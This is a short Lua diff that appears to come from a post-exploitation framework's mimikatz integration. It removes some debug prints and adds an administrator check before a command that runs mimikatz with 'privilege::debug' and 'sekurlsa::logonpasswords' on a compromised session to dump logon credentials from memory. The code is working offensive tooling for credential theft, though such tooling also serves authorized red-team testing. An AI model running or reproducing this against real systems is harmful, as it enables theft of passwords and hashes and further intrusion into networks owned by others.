@@ -770,9 +770,6 @@ local function run_mimikatz(args, cmd)
         table.insert(args, "exit")
     end
     local mimikatz_path = "common/mimikatz/mimikatz." .. arch .. ".exe"
-    print(#args)
-    print(args[1])
-    print(args[2])
     return execute_exe(session, script_resource(mimikatz_path), args, true, 600, arch, "", new_sac())
 end
 
@@ -812,9 +809,10 @@ local function run_logonpasswords()
     local session = active()
     session = with_context(session, "mimikatz")
     local arch = session.Os.Arch
-
+    if not isadmin(session) then
+            error("You need to be an admin to run this command")
+        end
     local args = {"privilege::debug","sekurlsa::logonpasswords","exit"}
-
     local mimikatz_path = "common/mimikatz/mimikatz." .. arch .. ".exe"
     return execute_exe(session, script_resource(mimikatz_path), args, true, 600, arch, "", new_sac(),callback_context(session))
 end
